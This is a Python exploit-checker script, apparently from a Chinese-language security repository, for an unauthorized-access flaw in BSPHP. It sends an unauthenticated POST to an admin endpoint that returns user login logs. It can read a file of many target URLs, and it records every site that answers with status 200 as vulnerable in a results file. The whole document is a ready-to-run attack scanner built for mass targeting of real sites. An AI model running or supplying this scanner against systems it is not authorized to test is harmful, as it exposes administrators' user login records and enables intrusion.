#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import json
import urllib3
import sys
urllib3.disable_warnings()

def title():
    print("""
                               BSPHP未授权访问漏洞
                      use: python3  BSPHP未授权访问漏洞.py
                                 Author: kento-sec
    """)

class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        vuln_url = self.url + "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows; U; Win98; fr-FR; rv:1.7.6) Gecko/20050226",
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        try:
            res = requests.post(url=vuln_url, headers=headers, proxies=proxies,verify=False, timeout=5)
            if res.status_code == 200:
                print(f"\033[31m[!]  目标系统: {self.url} 存在BSPHP未授权访问漏洞！\033[0m")
                with open("BSPHP未授权访问漏洞结果.txt", mode="a") as response:
                    response.write(self.url + "\n")
            else:
                print(f"[!]  目标系统: {self.url} 不存在BSPHP未授权访问漏洞！")
        except Exception as e:
            print(f"[-]  站点连接错误！")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip() # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)

if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="BSPHP未授权访问漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 BSPHP未授权访问漏洞.py -u http://127.0.0.1\neg2:>>>python3 BSPHP未授权访问漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()

